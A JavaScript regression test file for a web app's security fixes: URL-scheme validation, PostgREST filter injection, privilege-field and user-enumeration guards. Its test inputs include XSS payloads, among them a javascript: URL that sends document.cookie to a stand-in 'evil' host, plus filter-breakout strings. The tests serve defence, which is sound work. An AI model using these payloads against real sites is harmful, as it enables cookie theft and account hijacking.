const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');

// Regression tests for findings from the offensive security review.

// ── Stored-XSS via message attachmentUrl ──
// The server must reject non-http(s)/relative attachment URLs so a
// "javascript:"/"data:" scheme can never reach the recipient's <a href>.
function attachmentUrlAccepted(raw) {
  const s = String(raw).slice(0, 1000).trim();
  return /^https:\/\//i.test(s) || s.startsWith('/');
}

test('attachmentUrl: https URLs are accepted', () => {
  assert.ok(attachmentUrlAccepted('https://xyz.supabase.co/storage/v1/object/public/a.png'));
});

test('attachmentUrl: site-relative paths are accepted', () => {
  assert.ok(attachmentUrlAccepted('/uploads/a.png'));
});

test('attachmentUrl: javascript: scheme is rejected', () => {
  assert.ok(!attachmentUrlAccepted('javascript:fetch("//evil/"+document.cookie)'));
});

test('attachmentUrl: data: scheme is rejected', () => {
  assert.ok(!attachmentUrlAccepted('data:text/html,<script>alert(1)</script>'));
});

test('attachmentUrl: plain http (non-TLS) is rejected', () => {
  assert.ok(!attachmentUrlAccepted('http://evil.example/x.png'));
});

test('messagesController enforces the attachmentUrl scheme check', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'controllers', 'messagesController.js'), 'utf8');
  assert.match(src, /Invalid attachment URL/, 'send() must reject unsafe attachment URLs');
  assert.match(src, /\^https:\\\/\\\//, 'send() must require an https (or relative) attachment URL');
});

// ── PostgREST .or() filter injection ──
// The thread endpoints interpolate ids into a PostgREST .or() clause; the
// ID_PATTERN gate must block the metacharacters (comma, paren, dot) that
// would break out of the filter.
test('messages ID_PATTERN blocks PostgREST filter metacharacters', () => {
  const ID_PATTERN = /^[a-zA-Z0-9_-]{3,64}$/;
  assert.ok(ID_PATTERN.test('guide-cca8ae3f'));
  assert.ok(!ID_PATTERN.test('a,toId.eq.x'));     // comma
  assert.ok(!ID_PATTERN.test('a.eq.x'));          // dot
  assert.ok(!ID_PATTERN.test('a)or(b'));          // parens
  assert.ok(!ID_PATTERN.test('a b'));             // space
  assert.ok(!ID_PATTERN.test('ab'));              // too short
});

// ── Privilege-escalation guard ──
// Self-service profile updates must never let a user set trust/role fields.
test('profile updates do not accept privilege fields', () => {
  const auth  = fs.readFileSync(path.join(__dirname, '..', 'src', 'controllers', 'authController.js'), 'utf8');
  const guide = fs.readFileSync(path.join(__dirname, '..', 'src', 'controllers', 'guideController.js'), 'utf8');
  // The updateProfile handlers destructure an explicit field list; assert the
  // dangerous fields are not among the names they pull from req.body.
  for (const danger of ['userType', 'isVerified', 'isSuspended', 'rating', 'permissions', 'role']) {
    const authBlock  = auth.slice(auth.indexOf('exports.updateProfile'),  auth.indexOf('exports.updateProfile')  + 600);
    const guideBlock = guide.slice(guide.indexOf('exports.updateProfile'), guide.indexOf('exports.updateProfile') + 600);
    assert.ok(!new RegExp('\\b' + danger + '\\b').test(authBlock),  `auth updateProfile must not read ${danger}`);
    assert.ok(!new RegExp('\\b' + danger + '\\b').test(guideBlock), `guide updateProfile must not read ${danger}`);
  }
});

// ── Login user-enumeration ──
test('login returns the same message for bad email and bad password', () => {
  const auth = fs.readFileSync(path.join(__dirname, '..', 'src', 'controllers', 'authController.js'), 'utf8');
  const matches = auth.match(/Invalid email or password/g) || [];
  assert.ok(matches.length >= 2, 'both bad-email and bad-password paths must use the same generic message');
});

// ── Stored-XSS via review photo URLs (behavioural, imports the real code) ──
// Review photos render in <img src>; the server must drop any URL that isn't
// https or site-relative. This imports the ACTUAL validator so it can't drift.
const { safePhotoUrl } = require('../src/controllers/reviewController');

test('review photo URLs: https and site-relative are kept', () => {
  assert.equal(safePhotoUrl('https://x.supabase.co/storage/v1/object/public/p.png'),
    'https://x.supabase.co/storage/v1/object/public/p.png');
  assert.equal(safePhotoUrl('/uploads/p.png'), '/uploads/p.png');
  assert.equal(safePhotoUrl('  /uploads/p.png  '), '/uploads/p.png'); // trimmed
});

test('review photo URLs: unsafe schemes and junk are dropped', () => {
  assert.equal(safePhotoUrl('javascript:alert(1)'), null);
  assert.equal(safePhotoUrl('data:text/html,<script>alert(1)</script>'), null);
  assert.equal(safePhotoUrl('http://evil.example/x.png'), null); // non-TLS
  assert.equal(safePhotoUrl('"><img src=x onerror=alert(1)>'), null);
  assert.equal(safePhotoUrl(''), null);
  assert.equal(safePhotoUrl(null), null);
  assert.equal(safePhotoUrl(42), null);
});

// ── Shared-wishlist contact leak (source guard) ──
// The public shared-wishlist endpoint must run guides through sanitizeContact
// (viewer=null → contact fields stripped), not return raw rows.
test('shared wishlist sanitises guide contact fields', () => {
  const wl = fs.readFileSync(path.join(__dirname, '..', 'src', 'controllers', 'wishlistController.js'), 'utf8');
  assert.match(wl, /sanitizeContact/, 'wishlist get() must call sanitizeContact on returned guides');
});

// ── isSuspended NULL-trap guard ──
// Public listing paths must NOT put `isSuspended: false` in the eq filter
// (Postgres eq drops NULL rows → guides silently vanish). They must filter
// suspension in JS instead.
test('public listings do not use isSuspended:false in eq filters', () => {
  for (const f of ['guideController.js', 'tripController.js', 'teamController.js']) {
    const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'controllers', f), 'utf8');
    assert.ok(!/findAllWhere\(\{[^}]*isSuspended:\s*false/.test(src),
      `${f} must not pass isSuspended:false to findAllWhere`);
  }
  const seo = fs.readFileSync(path.join(__dirname, '..', 'src', 'routes', 'seoLanding.js'), 'utf8');
  assert.ok(!/findAllWhere\(\{[^}]*isSuspended:\s*false/.test(seo),
    'seoLanding.js must not pass isSuspended:false to findAllWhere');
});
